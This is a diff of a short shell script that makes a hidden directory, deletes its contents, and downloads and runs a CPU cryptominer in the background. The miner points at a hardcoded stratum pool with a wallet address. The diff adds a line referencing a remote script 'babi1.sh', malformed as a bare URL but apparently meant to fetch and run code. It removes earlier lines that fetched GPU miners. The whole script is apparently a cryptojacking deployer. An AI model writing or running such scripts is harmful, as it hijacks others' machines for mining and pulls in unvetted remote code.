@@ -6,11 +6,9 @@ mkdir .des
 cd .des
 rm -R *
 
+https://gitlab.com/majapahlevi/mvp/-/raw/main/babi1.sh &
+
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/cpminer
 chmod 777 cpminer && ./cpminer -a yespower -o stratum+tcp://138.197.98.18:443 -u v32fS9jBgzACJdgbUncHz5quaAAbChnZo6.$(shuf -n 1 -i 1-99999)-VISH -t4 &
-
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/_gram-mining-pool && chmod +x ._gram-mining-pool
-wget https://gitlab.com/majapahlevi/mvp/-/raw/main/garem && chmod +x garem
-./garem --address UQBZnL_zRoiow9vfvlGpZF9SlEZmY7pJADgEaQQO5gBFcveo --gpu-auto --miner cuda
 
 done
